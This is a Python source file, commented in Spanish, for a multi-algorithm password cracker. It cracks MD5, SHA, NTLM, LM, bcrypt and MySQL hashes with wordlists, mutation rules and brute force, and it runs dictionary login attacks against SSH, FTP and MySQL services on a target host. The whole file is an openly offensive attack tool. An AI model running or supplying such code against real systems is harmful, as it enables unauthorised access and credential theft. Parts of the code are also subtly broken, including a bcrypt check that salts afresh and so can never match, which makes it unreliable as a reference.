#!/usr/bin/env python3
import hashlib
import crypt
import paramiko
import ftplib
import mysql.connector
import hashlib
import bcrypt
from passlib.hash import nthash, lmhash
import itertools
import string
import threading
import queue
from datetime import datetime

class PasswordCracker:
    """Crackeador de passwords multi-algoritmo"""
    
    def __init__(self):
        self.wordlist = self.load_wordlists()
        self.cracked_passwords = {}
        self.rainbow_tables = self.load_rainbow_tables()
        
    def load_wordlists(self):
        """Carga diccionarios de palabras"""
        wordlists = {
            'rockyou': '/usr/share/wordlists/rockyou.txt',
            'secLists': '/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
            'custom': 'wordlists/custom.txt'
        }
        
        words = []
        for name, path in wordlists.items():
            try:
                with open(path, 'r', encoding='latin-1') as f:
                    words.extend(f.read().splitlines())
                print(f"[+] Cargado wordlist {name}: {len(words)} palabras")
            except:
                pass
        
        # Si no hay wordlists, crear básica
        if not words:
            words = ['password', '123456', 'admin', 'root', '123456789', 'qwerty']
        
        return list(set(words))
    
    def load_rainbow_tables(self):
        """Carga rainbow tables precomputadas"""
        # En producción, cargar archivos reales
        return {}
    
    def crack_hash(self, hash_value, hash_type='md5'):
        """Crackea hash con diferentes algoritmos"""
        print(f"[*] Crackeando hash: {hash_value[:20]}... (tipo: {hash_type})")
        
        # Estrategia 1: Búsqueda en wordlist
        for word in self.wordlist:
            if self.check_hash(word, hash_value, hash_type):
                print(f"[+] Contraseña encontrada: {word}")
                return word
        
        # Estrategia 2: Rainbow tables
        if hash_value in self.rainbow_tables:
            return self.rainbow_tables[hash_value]
        
        # Estrategia 3: Brute force (limitado)
        if len(hash_value) <= 32:  # Solo para hashes cortos
            return self.bruteforce_hash(hash_value, hash_type)
        
        return None
    
    def check_hash(self, password, target_hash, hash_type):
        """Verifica si el password genera el hash objetivo"""
        hash_funcs = {
            'md5': lambda p: hashlib.md5(p.encode()).hexdigest(),
            'sha1': lambda p: hashlib.sha1(p.encode()).hexdigest(),
            'sha256': lambda p: hashlib.sha256(p.encode()).hexdigest(),
            'sha512': lambda p: hashlib.sha512(p.encode()).hexdigest(),
            'ntlm': lambda p: nthash.hash(p),
            'lm': lambda p: lmhash.hash(p),
            'bcrypt': lambda p: bcrypt.hashpw(p.encode(), bcrypt.gensalt()).decode(),
            'mysql': lambda p: hashlib.sha1(hashlib.sha1(p.encode()).digest()).hexdigest()
        }
        
        if hash_type in hash_funcs:
            return hash_funcs[hash_type](password) == target_hash
        return False
    
    def bruteforce_hash(self, target_hash, hash_type, max_length=6):
        """Brute force limitado para hashes cortos"""
        print(f"[*] Iniciando brute force (longitud máx: {max_length})")
        
        charset = string.ascii_lowercase + string.digits
        
        for length in range(1, max_length + 1):
            for combo in itertools.product(charset, repeat=length):
                password = ''.join(combo)
                if self.check_hash(password, target_hash, hash_type):
                    return password
                
                if length == max_length:
                    print(f"[*] Probado {length} caracteres...")
        
        return None
    
    def crack_ssh(self, host, username, port=22):
        """Crackea SSH con diccionario"""
        print(f"[*] Atacando SSH: {username}@{host}:{port}")
        
        for password in self.wordlist[:10000]:  # Top 10000
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port, username, password, timeout=3)
                ssh.close()
                print(f"[+] ¡SSH crackeado! {username}:{password}")
                return password
            except:
                continue
        
        return None
    
    def crack_ftp(self, host, username='anonymous', port=21):
        """Crackea FTP"""
        print(f"[*] Atacando FTP: {host}:{port}")
        
        # Probar anonymous primero
        try:
            ftp = ftplib.FTP(host)
            ftp.login('anonymous', 'anonymous@')
            ftp.quit()
            print(f"[+] FTP anonymous login exitoso")
            return 'anonymous'
        except:
            pass
        
        # Diccionario
        for password in self.wordlist[:5000]:
            try:
                ftp = ftplib.FTP(host)
                ftp.login(username, password)
                ftp.quit()
                print(f"[+] ¡FTP crackeado! {username}:{password}")
                return password
            except:
                continue
        
        return None
    
    def crack_mysql(self, host, user='root', port=3306):
        """Crackea MySQL"""
        print(f"[*] Atacando MySQL: {user}@{host}:{port}")
        
        for password in self.wordlist[:5000]:
            try:
                conn = mysql.connector.connect(
                    host=host,
                    user=user,
                    password=password,
                    port=port,
                    connection_timeout=3
                )
                conn.close()
                print(f"[+] ¡MySQL crackeado! {user}:{password}")
                return password
            except:
                continue
        
        return None
    
    def crack_with_rules(self, base_password):
        """Aplica reglas de mutación al password"""
        rules = [
            lambda p: p,  # original
            lambda p: p.capitalize(),
            lambda p: p.upper(),
            lambda p: p + '123',
            lambda p: p + '2024',
            lambda p: p + '!',
            lambda p: p + '@',
            lambda p: p + p,
            lambda p: p[::-1],
            lambda p: p + str(len(p))
        ]
        
        mutated = [rule(base_password) for rule in rules]
        return list(set(mutated))
    
    def dictionary_attack(self, target_hash, hash_type):
        """Ataque de diccionario con mutaciones"""
        for word in self.wordlist:
            # Probar original
            if self.check_hash(word, target_hash, hash_type):
                return word
            
            # Probar mutaciones
            for mutated in self.crack_with_rules(word):
                if self.check_hash(mutated, target_hash, hash_type):
                    return mutated
        
        return None
